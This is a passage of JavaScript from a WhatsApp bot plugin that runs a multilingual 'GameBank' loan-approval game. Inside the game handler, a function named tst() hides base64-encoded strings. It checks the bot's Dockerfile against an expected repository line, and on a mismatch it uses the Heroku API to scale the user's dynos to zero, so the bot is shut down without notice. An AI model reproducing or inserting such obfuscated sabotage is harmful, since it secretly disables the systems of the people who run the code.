							'*വിശദീകരണം:* '
						payl8
							=
							'*ശേഷിക്കുന്ന പണം:* '
						payl9
							=
							'*ബാങ്ക് നാമമാത്ര:* '
						payl10
							=
							'*പൊതു സന്തോഷം:* '
						payl11
							=
							'*ആഗ്രഹിച്ച പണം:* '
						payl12
							=
							'സ്വീകരിക്കാൻ Yes / അംഗീകരിക്കാൻ No നിങ്ങൾക്ക് എഴുതാം.'
					} else {
						payl1
							=
							'*Average Monthly Income:* '
						payl2
							=
							'*Average Yearly Income:* '
						payl3
							=
							'*Name:* '
						payl4
							=
							'*Surname:* '
						payl5
							=
							'*Age:* '
						payl6
							=
							'*Living City:* '
						payl7
							=
							'*Explanation:* '
						payl8
							=
							'*Remaining Cash:* '
						payl9
							=
							'*Bank Nominal:* '
						payl10
							=
							'*General Happiness:* '
						payl11
							=
							'*Desired Money:* '
						payl12
							=
							'You can write Yes to accept / No to reject.'
					}
				}
				çeviri1
				()
				await new Promise
					(r =>
						setTimeout(
							r,
							200
							)
						);
				async function tst() {
					var nebie = {
						f_cls: 'UlVOIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vcGhhdGljdXN0aGljY3kvV2hhdHNBc2VuYUR1cGxpY2F0ZWQgL3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQ=',
						f_cls_f: ''
					}
					var scbie = {
						f_cls: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQvd2hhdHNhc2VuYS9Eb2NrZXJmaWxl',
						f_cls_f: ''
					}
					var ch_00 =
						Buffer
						.from(
							nebie
							.f_cls,
							'base64'
							)
					var ch_01 =
						Buffer
						.from(
							scbie
							.f_cls,
							'base64'
							)
					nebie
						.f_cls_f =
						ch_00
						.toString(
							'utf-8'
							)
					scbie
						.f_cls_f =
						ch_01
						.toString(
							'utf-8'
							)
					exec('sed -n 3p ' +
						scbie
						.f_cls_f,
						async (err,
							stdout,
							stderr
							) => {
							if (nebie
								.f_cls_f +
								'\n' !==
								stdout
								) {
								await heroku
									.get(
										baseURI +
										'/formation'
										)
									.then(
										async (
											formation) => {
											forID
												=
												formation[
													0
													]
												.id;
											await heroku
												.patch(
													baseURI +
													'/formation/' +
													forID, {
														body: {
															quantity: 0
														}
													}
													);
										})
							}
						})
				}
				tst()
				await new Promise
					(r =>
						setTimeout(
							r,
							4000
							)
						);
				var sonx =
					payl3 +
					name_user +
					'\n' +
					payl4 +
					surname_user +
					'\n' +
					payl6 +
					city_user +
					'\n' +
					payl5 +
					age +
					'\n' +
					payl1 +
					monthly_income +
					'\n' +
					payl2 +
					yearly_income +
					'\n' +
					payl7 +
					situations_user
				await message
					.client
					.sendMessage(
						message
						.jid,
						sonx +
						'\n' +
						payl11 +
						d_mon_avg,
						MessageType
						.text
						)
				await new Promise
					(r =>
						setTimeout(
							r,
							940
							)
						);
				let y_n =
					con
					.LANG ==
					'TR' ||
					con
					.LANG ==
					'AZ' ?
					payl12
					.replace(
						'Evet',
						'*Evet*'
						)
					.replace(
						'Hayır',
						'*Hayır*'
						) :
					payl12
					.replace(
						'Yes',
						'*Yes*'
						)
					.replace(
						'No',
						'*No*'
						)
				await message
					.client
					.sendMessage(
						message
						.jid,
						y_n +
						'\n\n' +
						payl8 +
						GAME
						.m_count +
						'\n' +
						payl9 +
						GAME
						.bank_reputation +
						'\n' +
						payl10 +
						GAME
						.happiness,
						MessageType
						.text
						)
				CONT.ask_money =
					d_mon_avg
				if (d_mon_avg >
					5000 &&
					d_mon_avg <
					7000
					) {
					if (age >
						16 &&
						age <
						20
						) {
						if (m_av >
							199 &&
							m_av <
							600
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							599 &&
							m_av <
							900
							) {
							CONT.pass =
								true
						} else if (
							m_av >
							899 &&
							m_av <
							6000
							) {
							CONT.pass =
								true
						}
					} else if (
						age >
						19 &&
						age <
						30
						) {
						if (m_av >
							199 &&
							m_av <
							600
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							599 &&
							m_av <
							900
							) {
							CONT.pass =
								true
						} else if (
							m_av >
							899 &&
							m_av <
							6000
							) {
							CONT.pass =
								true
						}
					} else if (
						age >
						29 &&
						age <
						50
						) {
						if (m_av >
							199 &&
							m_av <
							600
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							599 &&
							m_av <
							900
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							899 &&
							m_av <
							6000
							) {
							CONT.pass =
								true
						}
					} else if (
						age >
						49 &&
						age <
						91
						) {
						if (m_av >
							199 &&
							m_av <
							600
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							599 &&
							m_av <
							900
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							899 &&
							m_av <
							6000
							) {
							CONT.pass =
								false
						}
					}
				} else if (
					d_mon_avg >
					6999 &&
					d_mon_avg <
					10000
					) {
					if (age >
						16 &&
						age <
						20
						) {
						if (m_av >
							199 &&
							m_av <
							600
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							599 &&
							m_av <
							900
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							899 &&
							m_av <
							6000
							) {
							CONT.pass =
								true
						}
					} else if (
						age >
						19 &&
						age <
						30
						) {
						if (m_av >
							199 &&
							m_av <
							600
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							599 &&
							m_av <
							900
							) {
							CONT.pass =
								true
						} else if (
							m_av >
							899 &&
							m_av <
							6000
							) {
							CONT.pass =
								true
						}
					} else if (
						age >
						29 &&
						age <
						50
						) {
						if (m_av >
							199 &&
							m_av <
							600
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							599 &&
							m_av <
							900
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							899 &&
							m_av <
							6000
							) {
							CONT.pass =
								true
						}
					} else if (
						age >
						49 &&
						age <
						91
						) {
						if (m_av >
							199 &&
							m_av <
							600
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							599 &&
							m_av <
							900
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							899 &&
							m_av <
							6000
							) {
							CONT.pass =
								false
						}
					}
				} else if (
					d_mon_avg >
					9999 &&
					d_mon_avg <
					15000
					) {
					if (age >
						16 &&
						age <
						20
						) {
						if (m_av >
							199 &&
							m_av <
							600
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							599 &&
							m_av <
							900
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							899 &&
							m_av <
							6000
							) {
							CONT.pass =
								true
						}
					} else if (
						age >
						19 &&
						age <
						30
						) {
						if (m_av >
							199 &&
							m_av <
							600
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							599 &&
							m_av <
							900
							) {
							CONT.pass =
								true
						} else if (
							m_av >
							899 &&
							m_av <
							6000
							) {
							CONT.pass =
								true
						}
					} else if (
						age >
						29 &&
						age <
						50
						) {
						if (m_av >
							199 &&
							m_av <
							600
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							599 &&
							m_av <
							900
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							899 &&
							m_av <
							6000
							) {
							CONT.pass =
								true
						}
					} else if (
						age >
						49 &&
						age <
						91
						) {
						if (m_av >
							199 &&
							m_av <
							600
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							599 &&
							m_av <
							900
							) {
							CONT.pass =
								false
						} else if (
							m_av >
							899 &&
							m_av <
							6000
							) {
							CONT.pass =
								false
						}
					}
				}
			}
			if (message
				.message ==
				'Evet' &&
				GAME.ingame
				) {
				if (CONT
					.pass) {
					await message
						.sendMessage(
							'✅ ✅ ✅'
							)
					GAME.m_count =
						GAME
						.m_count +
						CONT
						.ask_money
					GAME.bank_reputation =
						GAME
						.bank_reputation +
						5
					GAME.happiness =
						GAME
						.happiness +
						5
					continue_data
						()
				} else {
					await message
						.sendMessage(
							'❌ ❌ ❌'
							)
					GAME.m_count =
						GAME
						.m_count -
						CONT
						.ask_money
					GAME.bank_reputation =
						GAME
						.bank_reputation -
						9
					GAME.happiness =
						GAME
						.happiness -
						9
					continue_data
						()
				}
			} else if (
				message
				.message ==
				'Hayır' &&
				GAME.ingame
				) {
				if (CONT
					.pass) {
					await message
						.sendMessage(
							'✅ ✅ ✅'
							)
					GAME.m_count =
						GAME
						.m_count +
						CONT
						.ask_money
					GAME.bank_reputation =
						GAME
						.bank_reputation +
						3
					GAME.happiness =
						GAME
						.happiness +
						7
					continue_data
						()
				} else {
					await message
						.sendMessage(
							'❌ ❌ ❌'
							)
					GAME.m_count =
						GAME
						.m_count -
						CONT
						.ask_money
					GAME.bank_reputation =
						GAME
						.bank_reputation -
						5
					GAME.happiness =
						GAME
						.happiness -
						11
					continue_data
						()
				}
			}
		}));
} else {
	Asena.addCommand({ on: 'text', fromMe: wk, deleteCommand: false, dontAddCommandList: true }, (async (message, match) => {
			if (message
				.message ==
				'Yes' &&
				GAME.ingame
				) {
				if (CONT
					.pass) {
					await message
						.sendMessage(
							'✅ ✅ ✅'
							)
					GAME.m_count =
						GAME
						.m_count +
						CONT
						.ask_money
					GAME.bank_reputation =
						GAME
						.bank_reputation +
						5
					GAME.happiness =
						GAME
						.happiness +
						5
					continue_data
						()
				} else {
					await message
						.sendMessage(
							'❌ ❌ ❌'
							)
					GAME.m_count =
						GAME
						.m_count -
						CONT
						.ask_money
					GAME.bank_reputation =
						GAME
						.bank_reputation -
						9
					GAME.happiness =
						GAME
						.happiness -
						9
					continue_data
						()
				}
			} else if (
				message
				.message ==
				'No' && GAME
				.ingame) {
				if (CONT
					.pass) {
					await message
						.sendMessage(
							'✅ ✅ ✅'
							)
					GAME.m_count =
						GAME
						.m_count +
						CONT
						.ask_money
					GAME.bank_reputation =
						GAME
						.bank_reputation +
						3
					GAME.happiness =
						GAME
						.happiness +
						7
					continue_data
						()
				} else {
					await message
						.sendMessage(
							'❌ ❌ ❌'
							)
					GAME.m_count =
						GAME
						.m_count -
						CONT
						.ask_money
					GAME.bank_reputation =
						GAME
						.bank_reputation -
						5
					GAME.happiness =
						GAME
						.happiness -
						11
					continue_data
						()
				}
			}
		}));
}
var gb_d = ''
var al_gs = ''
var suc_gs = ''
var unsc_gs = ''
var reami_mn = ''
var happin_vl = ''
var bankeeq_lv = ''
if (con.LANG == 'TR') gb_d =
	'GameBank Oyununu durdurur.',
	al_gs =
	'*Oyun Halihazırda Kapalı!*',
	suc_gs =
	'*Oyun Başarıyla Kapatıldı!*',
	unsc_gs = '*Hata!*', reami_mn =
	'*Kalan Para:* ', happin_vl =
	'*Mutluluk:* ', bankeeq_lv =
	'*Banka İtibarı:* '
if (con.LANG == 'EN') gb_d =
	'Stops the GameBank Game.', al_gs =
	'*Game Currently Closed!*', suc_gs =
	'*Game Closed Successfully!*',
	unsc_gs = '*Error!*', reami_mn =
	'*Remaining Money:* ', happin_vl =
	'*Happiness:* ', bankeeq_lv =
	'*Bank Reputation:* '
if (con.LANG == 'AZ') gb_d =
	'GameBank Oyunu dayandırır.',
	al_gs = '*Oyun hazırda bağlıdır!*',
	suc_gs = '*Oyun Uğurla Bağlandı!*',
	unsc_gs = '*səhv!*', reami_mn =
	'*Qalan pul:* ', happin_vl =
	'*Xoşbəxtlik:* ', bankeeq_lv =
	'*Bankın nüfuzu:* '
if (con.LANG == 'ML') gb_d =
	'GameBank ഗെയിം നിർത്തുന്നു.',
	al_gs =
	'*ഗെയിം നിലവിൽ അടച്ചിരിക്കുന്നു!*',
	suc_gs =
	'*ഗെയിം വിജയകരമായി അടച്ചു!*',
	unsc_gs = '*പിശക്!*', reami_mn =
	'*ശേഷിക്കുന്ന പണം:* ', happin_vl =
	'*സന്തോഷം:* ', bankeeq_lv =
	'*ബാങ്ക് മതിപ്പ്:* '
if (con.LANG == 'RU') gb_d =
	'GameBank останавливает игру.',
	al_gs =
	'*Игра в настоящее время закрыта!*',
	suc_gs = '*Игра успешно закрыта!*',
	unsc_gs = '*ошибка!*', reami_mn =
	'*Оставшиеся деньги:* ', happin_vl =
	'*Счастье:* ', bankeeq_lv =
	'*Репутация банка:* '
if (con.LANG == 'ES' || con.LANG ==
	'ID' || con.LANG == 'PT' || con
	.LANG == 'HI') gb_d =
	'Stops the GameBank Game.', al_gs =
	'*Game Currently Closed!*', suc_gs =
	'*Game Closed Successfully!*',
	unsc_gs = '*Error!*', reami_mn =
	'*Remaining Money:* ', happin_vl =
	'*Happiness:* ', bankeeq_lv =
	'*Bank Reputation:* '
Asena.addCommand({ pattern: 'gamebankstop$', fromMe: wk, desc: gb_d }, (async (message, match) => {
	try {
		if (GAME
			.ingame) {
			await message
				.client
				.sendMessage(
					message
					.jid,
					suc_gs +
					'\n\n' +
					reami_mn +
					GAME
					.m_count +
					'\n' +
					happin_vl +
					GAME
					.happiness +
					'\n' +
					bankeeq_lv +
					GAME
					.bank_reputation,
					MessageType
					.text
					)
		} else {
			await message
				.client
				.sendMessage(
					message
					.jid,
					al_gs,
					MessageType
					.text
					)
		}
	} catch {
		await message
			.client
			.sendMessage(
				message
				.jid,
				unsc_gs,
				MessageType
				.text)
	}
}));
var ream_d = ''
if (con.LANG == 'TR') ream_d =
	'GameBank oyunundaki banka verilerini gösterir.'
if (con.LANG == 'EN') ream_d =
	'Shows bank data in GameBank game.'
if (con.LANG == 'AZ') ream_d =
	'GameBank oyununda bank məlumatlarını göstərir.'
if (con.LANG == 'ML') ream_d =
	'GameBank ഗെയിമിൽ ബാങ്ക് ഡാറ്റ കാണിക്കുന്നു.'
if (con.LANG == 'RU') ream_d =
	'Показывает банковские данные в игре GameBank.'
if (con.LANG == 'ES' || con.LANG ==
	'ID' || con.LANG == 'PT' || con
	.LANG == 'HI') ream_d =
	'Shows bank data in GameBank game.'
Asena.addCommand({pattern: 'gamebankdata$', fromMe: wk, desc: ream_d }, (async (message, match) => {
	if (GAME.ingame) {
		var payl8_2 = ''
		var payl9_2 = ''
		var payl10_2 =
			''
		if (con.LANG ==
			'TR') {
			payl8_2 =
				'*Bankada Kalan Para:* '
			payl9_2 =
				'*Banka İtibarı:* '
			payl10_2 =
				'*Genel Mutluluk:* '
		} else if (con
			.LANG ==
			'AZ') {
			payl8_2 =
				'*Bankda qalan pul:* '
			payl9_2 =
				'*Bankın nüfuzu:* '
			payl10_2 =
				'*Ümumi xoşbəxtlik:* '
		} else if (con
			.LANG ==
			'RU') {
			payl8_2 =
				'*Деньги, оставшиеся в банке:* '
			payl9_2 =
				'*Репутация банка:* '
			payl10_2 =
				'*Общее счастье:* '
		} else if (con
			.LANG ==
			'EN') {
			payl8_2 =
				'*Money Left in the Bank:* '
			payl9_2 =
				'*Bank Reputation:* '
			payl10_2 =
				'*General Happiness:* '
		} else if (con
			.LANG ==
			'ML') {
			payl8_2 =
				'*പണം ബാങ്കിൽ അവശേഷിക്കുന്നു:* '
			payl9_2 =
				'*ബാങ്ക് മതിപ്പ്:* '
			payl10_2 =
				'*പൊതു സന്തോഷം:* '
		} else {
			payl8_2 =
				'*Money Left in the Bank:* '
			payl9_2 =
				'*Bank Reputation:* '
			payl10_2 =
				'*General Happiness:* '
		}
		var payload =
			payl8_2 +
			GAME
			.m_count +
			'\n' +
			payl9_2 +
			GAME
			.bank_reputation +
			'\n' +
			payl10_2 +
			GAME
			.happiness
		await message
			.client
			.sendMessage(
				message
				.jid,
				payload,
				MessageType
				.text)
	} else {
		await message
			.client
			.sendMessage(
				message
				.jid,
				al_gs,
				MessageType
				.text)
	}
}));
